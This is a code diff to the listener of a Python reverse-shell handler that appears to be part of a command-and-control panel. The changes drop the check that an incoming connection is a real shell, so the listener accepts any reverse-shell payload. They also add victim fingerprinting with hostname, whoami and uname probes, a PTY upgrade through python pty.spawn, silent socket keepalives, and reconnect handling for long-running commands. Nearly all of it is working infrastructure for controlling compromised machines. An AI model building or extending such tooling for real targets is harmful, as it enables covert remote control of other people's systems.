@@ -18,58 +18,87 @@ from app.utils import clean_shell_output
 class ShellConnection:
     """Represents an active reverse shell connection."""
     
-    def __init__(self, conn: socket.socket, addr: tuple, shell_id: int):
+    def __init__(self, conn: socket.socket, addr: tuple, shell_id: int, platform: str = "Unknown"):
         self.conn = conn
         self.addr = addr
         self.shell_id = shell_id
+        self.platform = platform
         self.lock = threading.Lock()
         self.is_active = True
+        self.ws_attached = False  # True when a WebSocket terminal is actively reading
         
-    def send_command(self, command: str, timeout: int = 30) -> str:
-        """Send command to shell and receive output."""
+    def send_command(self, command: str, timeout: int = 120) -> str:
+        """Send command to shell and receive output.
+
+        Args:
+            command: The shell command to execute.
+            timeout: Maximum seconds to wait for output (default 120 / 2 min).
+
+        If the command does not finish within *timeout* seconds the
+        connection is considered tainted (e.g. by ``sudo`` waiting for
+        a password or ``ping`` running forever) and the connection is
+        closed so the reverse-shell client can reconnect cleanly.
+        """
+        timed_out = False
         with self.lock:
             try:
                 if not self.is_active:
                     return "Error: Connection is not active"
-                
+
+                # Drain any buffered data (e.g. from keepalive prompts)
+                self.conn.settimeout(0.5)
+                try:
+                    while True:
+                        leftover = self.conn.recv(4096)
+                        if not leftover:
+                            break
+                except (socket.timeout, OSError):
+                    pass
+
                 # Send command
                 self.conn.settimeout(timeout)
                 cmd_bytes = (command.strip() + '\n').encode('utf-8')
                 self.conn.sendall(cmd_bytes)
-                
-                # Receive response
+
+                # Receive response with hard deadline
                 output = b""
-                self.conn.settimeout(5)  # Shorter timeout for receiving
-                
-                # Read until we get a delimiter or timeout
-                start_time = time.time()
-                while time.time() - start_time < timeout:
+                deadline = time.time() + timeout
+                idle_timeout = 3  # seconds of silence to consider command done
+                self.conn.settimeout(idle_timeout)
+
+                while True:
+                    remaining = deadline - time.time()
+                    if remaining <= 0:
+                        timed_out = True
+                        break
                     try:
+                        self.conn.settimeout(min(idle_timeout, remaining))
                         chunk = self.conn.recv(4096)
                         if not chunk:
                             break
                         output += chunk
-                        # Simple heuristic: if we get a newline and no data for 0.5s, we're done
-                        if b'\n' in chunk:
-                            time.sleep(0.5)
-                            self.conn.settimeout(0.5)
-                            try:
-                                chunk = self.conn.recv(4096)
-                                if chunk:
-                                    output += chunk
-                                else:
-                                    break
-                            except socket.timeout:
-                                break
                     except socket.timeout:
+                        # No data received within idle_timeout
                         if output:
+                            # Got some output and then silence – command likely finished
                             break
+                        # No output at all yet – keep waiting until deadline
                         continue
-                
-                output = output.decode('utf-8', errors='replace')
-                # Clean ANSI escape codes from output
-                output = clean_shell_output(output)
-                return output
+
+                output_str = output.decode('utf-8', errors='replace')
+                output_str = clean_shell_output(output_str, command)
+
+                if timed_out:
+                    # Connection is tainted – close it so it can reconnect
+                    self.is_active = False
+                    try:
+                        self.conn.close()
+                    except Exception:
+                        pass
+                    notice = f"\n\n⚠️ Command timed out after {timeout}s. Session closed – it will reconnect automatically."
+                    return output_str + notice
+
+                return output_str
             except Exception as exc:
                 self.is_active = False
                 return f"Error: {exc}"
@@ -161,100 +190,153 @@ class ShellListener:
         """Handle a new reverse shell connection."""
         ip, port = addr
         print(f"[+] New connection from {ip}:{port}")
-        
+
+        # Enable TCP-level keepalive so the OS detects dead connections
+        # without us sending application-level commands.
+        try:
+            conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+        except OSError:
+            pass
+
         shell_id = None
         try:
             with self.app.app_context():
-                # Validate that this is actually a shell, not just a TCP connection
-                conn.settimeout(5)
-                
-                # Send shell detection commands
-                test_commands = [
-                    b'echo "SHELL_VERIFY_TOKEN"\n',
-                    b'whoami\n',
-                    b'id\n'
-                ]
-                
-                is_valid_shell = False
-                
-                for cmd in test_commands:
-                    try:
-                        conn.sendall(cmd)
-                        time.sleep(0.1)  # Short wait for response
-                        response = conn.recv(1024)
-                        
-                        # Check if we got shell-like response
-                        if response and len(response) > 0:
-                            decoded = response.decode('utf-8', errors='ignore')
-                            
-                            # Look for shell prompt indicators or command output
-                            shell_indicators = ['$', '#', '>', 'SHELL_VERIFY_TOKEN', 'uid=', 'gid=']
-                            if any(indicator in decoded for indicator in shell_indicators):
-                                is_valid_shell = True
-                                break
-                    except Exception:
-                        continue
-                
-                if not is_valid_shell:
-                    # Not a valid shell, reject connection
-                    conn.close()
-                    print(f"[!] Rejected non-shell connection from {ip}:{port}")
-                    return
-                
-                # Try to get system info
+                # Accept any connection that arrives on the listener port.
+                # This supports all shell types: Linux bash/sh, Windows
+                # cmd/PowerShell, macOS zsh, Python/PHP/Ruby/Java shells,
+                # netcat, Invoke-Expression loops, and any other reverse
+                # shell payload.
+
+                initial_banner = b""
                 try:
-                    # Send info gathering commands
-                    hostname = ""
-                    platform = ""
-                    shell_user = ""
-                    default_hostname = f"host-{ip}"
-                    
-                    # Try to get hostname
-                    conn.sendall(b'hostname\n')
-                    time.sleep(0.5)
-                    try:
-                        hostname_raw = conn.recv(1024).decode('utf-8', errors='replace')
-                        hostname = clean_shell_output(hostname_raw).strip()
-                        if not hostname:
-                            hostname = default_hostname
-                    except:
-                        hostname = default_hostname
-                    
-                    # Try to get username
-                    conn.sendall(b'whoami 2>/dev/null || echo %USERNAME%\n')
-                    time.sleep(0.5)
-                    try:
-                        shell_user_raw = conn.recv(1024).decode('utf-8', errors='replace')
-                        shell_user = clean_shell_output(shell_user_raw).strip()
-                        if not shell_user:
-                            shell_user = "unknown"
-                    except:
-                        shell_user = "unknown"
-                    
-                    # Try to detect OS
-                    conn.sendall(b'uname -a 2>/dev/null || ver\n')
-                    time.sleep(0.5)
-                    try:
-                        os_info_raw = conn.recv(2048).decode('utf-8', errors='replace')
-                        os_info = clean_shell_output(os_info_raw).strip()
-                        if 'Linux' in os_info:
+                    conn.settimeout(3)
+                    initial_banner = conn.recv(4096)
+                except (socket.timeout, OSError):
+                    pass
+
+                # Detect platform early from the banner — if the shell
+                # sent something that looks like Windows, we skip Unix
+                # probes entirely to avoid confusing the shell.
+                banner_text = initial_banner.decode('utf-8', errors='replace') if initial_banner else ''
+                win_indicators = ['Windows', 'Microsoft', 'MINGW', 'MSYS',
+                                  'CYGWIN', 'PowerShell', 'PS C:\\', 'C:\\']
+                detected_windows = any(w in banner_text for w in win_indicators)
+
+                hostname = f"host-{ip}"
+                platform = "Windows" if detected_windows else "Unknown"
+                shell_user = "unknown"
+
+                # --- Lightweight info gathering ---
+                # Only attempt ONE probe command per field.  Each probe
+                # waits at most 3 s for a response.  If the shell doesn't
+                # respond we simply keep defaults — this prevents
+                # overwhelming slow / PowerShell shells with a burst of
+                # commands.
+                try:
+                    marker_id = secrets.token_hex(4)
+                    ms = f"C2S{marker_id}"
+                    me = f"C2E{marker_id}"
+
+                    def _extract(raw: str) -> str:
+                        s = raw.rfind(ms)
+                        e = raw.rfind(me)
+                        if s >= 0 and e > s:
+                            block = raw[s + len(ms):e].strip()
+                            lines = [l.strip() for l in block.split('\n')
+                                     if l.strip() and ms not in l and me not in l]
+                            return lines[0] if lines else ""
+                        cleaned = clean_shell_output(raw).strip()
+                        lines = [l for l in cleaned.split('\n') if l.strip()]
+                        return lines[-1].strip() if lines else ""
+
+                    def _probe(cmd: str, wait: float = 1.5) -> str:
+                        """Send a single probe and return the output."""
+                        # Drain stale data
+                        conn.settimeout(0.3)
+                        try:
+                            while True:
+                                d = conn.recv(4096)
+                                if not d:
+                                    break
+                        except (socket.timeout, OSError):
+                            pass
+                        conn.sendall(cmd.encode('utf-8'))
+                        time.sleep(wait)
+                        buf = b""
+                        conn.settimeout(3)
+                        try:
+                            while True:
+                                chunk = conn.recv(4096)
+                                if not chunk:
+                                    break
+                                buf += chunk
+                        except (socket.timeout, OSError):
+                            pass
+                        return buf.decode('utf-8', errors='replace')
+
+                    # hostname — works on both Unix and Windows
+                    raw = _probe(f'echo {ms}; hostname; echo {me}\n')
+                    h = _extract(raw)
+                    if h:
+                        hostname = h
+
+                    # whoami
+                    raw = _probe(f'echo {ms}; whoami; echo {me}\n')
+                    u = _extract(raw)
+                    if u:
+                        shell_user = u
+
+                    # OS detection (only if not already detected from banner)
+                    if not detected_windows:
+                        raw = _probe(f'echo {ms}; uname -s; echo {me}\n')
+                        if 'Linux' in raw:
                             platform = 'Linux'
-                        elif 'Darwin' in os_info:
+                        elif 'Darwin' in raw:
                             platform = 'macOS'
-                        elif 'Windows' in os_info or 'Microsoft' in os_info:
+                        elif any(w in raw for w in win_indicators):
                             platform = 'Windows'
                         else:
-                            platform = 'Unknown'
-                    except:
-                        platform = "unknown"
-                        
+                            raw2 = _probe(f'echo {ms}; ver; echo {me}\n')
+                            if any(w in raw2 for w in ['Windows', 'Microsoft']):
+                                platform = 'Windows'
+
                 except Exception:
-                    hostname = default_hostname
-                    platform = "Unknown"
-                    shell_user = "unknown"
-                
-                # Create or update shell record
-                shell = ReverseShell.query.filter_by(address=ip, port=port).first()
+                    pass  # keep defaults
+
+                # PTY upgrade — only for Unix-like systems
+                if platform not in ('Windows',):
+                    try:
+                        pty_cmd = (
+                            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null "
+                            "|| python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null "
+                            "|| python3 -c 'import pty; pty.spawn(\"/bin/sh\")' 2>/dev/null "
+                            "|| script -qc /bin/bash /dev/null 2>/dev/null "
+                            "|| script -qc /bin/sh /dev/null 2>/dev/null\n"
+                        )
+                        conn.sendall(pty_cmd.encode('utf-8'))
+                        time.sleep(1.5)
+                        conn.settimeout(2)
+                        try:
+                            while True:
+                                d = conn.recv(4096)
+                                if not d:
+                                    break
+                        except (socket.timeout, OSError):
+                            pass
+                        conn.sendall(b'stty rows 50 cols 200 2>/dev/null; export TERM=xterm-256color\n')
+                        time.sleep(0.5)
+                        conn.settimeout(1)
+                        try:
+                            conn.recv(4096)
+                        except (socket.timeout, OSError):
+                            pass
+                    except Exception:
+                        pass
+
+                # Create or update shell record – match by IP address only
+                # so that reconnections from the same host reuse the
+                # existing record.
+                shell = ReverseShell.query.filter_by(address=ip).first()
                 if not shell:
                     session_id = secrets.token_urlsafe(16)
                     shell = ReverseShell(
@@ -271,36 +353,79 @@ class ShellListener:
                     )
                     db.session.add(shell)
                 else:
-                    # Generate new session_id if not exists
+                    shell.port = port
                     if not shell.session_id:
                         shell.session_id = secrets.token_urlsafe(16)
                     shell.status = "connected"
+                    shell.disconnected_at = None
                     shell.connected_at = datetime.utcnow()
                     shell.last_seen = datetime.utcnow()
-                    if hostname:
+                    if hostname and hostname != f"host-{ip}":
                         shell.hostname = hostname
-                    if platform:
+                        shell.name = hostname
+                    if platform and platform != 'Unknown':
                         shell.platform = platform
-                    if shell_user:
+                    if shell_user and shell_user != "unknown":
                         shell.shell_user = shell_user
-                
+
                 db.session.commit()
                 shell_id = shell.id
-                
-                # Store connection
+
                 with self.lock:
-                    self.connections[shell_id] = ShellConnection(conn, addr, shell_id)
-                
+                    self.connections[shell_id] = ShellConnection(
+                        conn, addr, shell_id, platform=platform)
+
                 print(f"[+] Shell registered: {shell.name} (ID: {shell_id}, Session: {shell.session_id})")
-                
-                # Keep connection alive
+
+                # Broadcast notification
+                try:
+                    from app.extensions import socketio
+                    socketio.emit("new_shell_connected", {
+                        "id": shell_id,
+                        "name": shell.name,
+                        "address": addr[0],
+                        "platform": platform,
+                        "hostname": hostname,
+                    })
+                except Exception:
+                    pass
+
+                # --- Keepalive loop ---
+                # We do NOT send commands for keepalive.  Instead we rely
+                # on TCP-level SO_KEEPALIVE (set above) and periodically
+                # attempt a non-destructive zero-byte peek on the socket.
+                # This avoids confusing PowerShell Invoke-Expression loops
+                # and other non-standard shells.
                 while self.is_running and self.connections.get(shell_id):
                     try:
-                        # Send keepalive
-                        conn.settimeout(30)
-                        conn.sendall(b'\n')
-                        time.sleep(30)
-                        
+                        time.sleep(15)
+
+                        shell_conn = self.connections.get(shell_id)
+                        if not shell_conn or not shell_conn.is_active:
+                            break
+
+                        # Check if the socket is still alive via non-blocking peek
+                        try:
+                            conn.settimeout(0)
+                            data = conn.recv(1, socket.MSG_PEEK)
+                            if data == b'':
+                                # Peer closed the connection
+                                print(f"[-] Shell {shell_id} — peer closed connection")
+                                break
+                        except BlockingIOError:
+                            # No data available — socket is alive (good)
+                            pass
+                        except (ConnectionResetError, BrokenPipeError,
+                                ConnectionAbortedError, OSError):
+                            print(f"[-] Keepalive check failed for shell {shell_id}")
+                            break
+                        finally:
+                            # Restore a reasonable timeout for other operations
+                            try:
+                                conn.settimeout(30)
+                            except OSError:
+                                pass
+
                         # Update last_seen
                         with self.app.app_context():
                             shell_record = db.session.get(ReverseShell, shell_id)
@@ -329,14 +454,32 @@ class ShellListener:
                 
                 print(f"[-] Shell disconnected: ID {shell_id}")
     
-    def execute_command(self, shell_id: int, command: str, timeout: int = 30) -> tuple[bool, str]:
-        """Execute a command on a connected shell."""
+    def execute_command(self, shell_id: int, command: str, timeout: int = 120) -> tuple[bool, str]:
+        """Execute a command on a connected shell.
+
+        The default timeout is 120 seconds (2 minutes).  If the command
+        exceeds this, the underlying connection is closed so the
+        reverse-shell client can reconnect cleanly.
+        """
         with self.lock:
             conn = self.connections.get(shell_id)
             if not conn or not conn.is_active:
                 return False, "Shell is not connected"
-        
+
         output = conn.send_command(command, timeout)
+
+        # If the connection was closed due to timeout, clean up
+        if not conn.is_active:
+            with self.lock:
+                self.connections.pop(shell_id, None)
+            with self.app.app_context():
+                shell = db.session.get(ReverseShell, shell_id)
+                if shell:
+                    shell.status = "disconnected"
+                    shell.disconnected_at = datetime.utcnow()
+                    db.session.commit()
+            return True, output
+
         return True, output
     
     def get_active_shells(self) -> list[int]:
